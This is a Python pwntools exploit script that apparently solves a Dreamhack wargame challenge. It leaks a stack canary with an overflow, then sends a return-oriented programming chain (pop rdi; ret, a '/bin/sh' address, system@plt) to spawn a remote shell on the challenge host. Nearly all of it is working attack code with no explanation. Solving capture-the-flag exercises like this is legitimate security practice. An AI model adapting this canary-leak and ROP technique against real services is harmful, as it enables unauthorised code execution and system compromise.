from pwn import *

def log(a, b):
    return success(": ".join([a, hex(b)]))

p = remote("host3.dreamhack.games", 19918)

canary_payload = b'A'*0x39
p.sendafter("Buf: ", canary_payload)
p.recvuntil(canary_payload)
canary = p.recvn(7)
canary = u64(b'\x00' + canary)

log("Canary", canary)

no_op = 0x400285
return_gadget = 0x400853
binsh = 0x400874
systemplt = 0x4005d0

log("no_op gadget", no_op)
log("pop rdi; ret", return_gadget)
log("\"/bin/sh\"", binsh)
log("ststem plt address", systemplt)

payload = b'A'*0x38            # dummy values to reach canary address
payload += p64(canary)         # canary value
payload += b'B'*0x8            # dummy value for sfp
payload += p64(no_op)          # a gadget has no meaning
payload += p64(return_gadget)  # pop rdi; ret address
payload += p64(binsh)          # "/bin/sh" address
payload += p64(systemplt)      # system@plt address

p.sendafter("Buf: ", payload)

p.interactive()
